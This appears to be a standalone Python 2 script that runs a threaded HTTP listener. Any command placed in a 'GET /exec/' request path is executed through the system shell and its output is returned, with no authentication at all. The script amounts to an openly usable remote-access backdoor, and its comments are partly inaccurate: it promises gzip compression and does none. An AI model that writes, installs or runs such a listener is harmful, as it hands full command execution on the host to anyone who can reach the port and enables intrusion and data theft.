#!/usr/bin/env python

import socket,os,re,subprocess,sys,signal
from urllib import unquote
import thread, gzip

def signal_handler(signal,frame):
	sys.exit(1)

def handler(client,addr):
	while 1:
		try:	#receiving client data and unquoting it
			data = client.recv(1024)
			data = unquote(data)
			#performing match for the command
			match = re.search('GET /exec/(.*) HTTP/1.1',data)
			if match:
				command = match.group(1)
				command = unquote(command)	
				if command:
					#executing the command,sending the gzipped content as HTTP response
					p = subprocess.Popen(command, stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)
					result,err = p.communicate()
					if result:
						client.sendall("HTTP/1.1 200 OK\r\nContent-Type:text/html\r\n\r\n"+result)
					else:
						client.sendall("HTTP/1.1 200 OK\r\nContent-Length:0\r\n\r\n")	
				else:		
					client.sendall("HTTP/1.1 200 OK\r\nContent-Length:0\r\n\r\n")	
			else:	
				#sending 404 response		
				client.sendall("HTTP/1.1 404 Not Found\r\n"
				+"Content-Type:text/html\r\n"
				+"Content-Length:0\r\n"
				+"\r\n\r\n")
			client.close()
		except:
			pass
			

		
if __name__=='__main__':		
	signal.signal(signal.SIGINT,signal_handler)
	port = int(sys.argv[1])
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(('',port))
	s.listen(1)
	while True:
		client,addr = s.accept()
		thread.start_new_thread(handler,(client,addr))
		
